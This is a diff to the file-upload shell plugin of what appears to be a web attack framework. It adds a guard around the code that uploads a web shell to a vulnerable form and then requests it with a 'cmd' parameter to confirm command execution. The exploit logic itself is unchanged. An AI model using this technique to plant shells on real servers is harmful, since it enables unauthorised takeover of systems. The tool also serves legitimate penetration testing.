@@ -129,27 +129,32 @@ class fileUploadShell(baseAttackPlugin):
         fname = self._create_file( extension )
         file_handler = open( fname , "r")
         
-        # Upload the file
-        for file_var_name in vuln_obj['fileVars']:
-            # the [0] was added here to support repeated parameter names
-            exploit_dc[file_var_name][0] = file_handler
-        http_method = getattr( self._urlOpener,  method)
-        response = http_method( vuln_obj.getURL() ,  exploit_dc )
+        #   If there are files,
+        if 'fileVars' in vuln_obj:
+            #
+            #   Upload the file
+            #
+            for file_var_name in vuln_obj['fileVars']:
+                # the [0] was added here to support repeated parameter names
+                exploit_dc[file_var_name][0] = file_handler
+            http_method = getattr( self._urlOpener,  method)
+            response = http_method( vuln_obj.getURL() ,  exploit_dc )
+            
+            # Call the uploaded script with an empty value in cmd parameter
+            # this will return the payloads.SHELL_IDENTIFIER if success
+            dst = vuln_obj['fileDest']
+            self._exploit = urlParser.getDomainPath( dst ) + self._file_name + '?cmd='
+            response = self._urlOpener.GET( self._exploit )
+            
+            # Clean-up
+            file_handler.close()
+            os.remove( self._path_name )
+            
+            if payloads.SHELL_IDENTIFIER in response.getBody():
+                return True
         
-        # Call the uploaded script with an empty value in cmd parameter
-        # this will return the payloads.SHELL_IDENTIFIER if success
-        dst = vuln_obj['fileDest']
-        self._exploit = urlParser.getDomainPath( dst ) + self._file_name + '?cmd='
-        response = self._urlOpener.GET( self._exploit )
-        
-        # Clean-up
-        file_handler.close()
-        os.remove( self._path_name )
-        
-        if payloads.SHELL_IDENTIFIER in response.getBody():
-            return True
-        else:
-            return False
+        #   If we got here, there is nothing positive to report ;)
+        return False
     
     def _create_file( self, extension ):
         '''
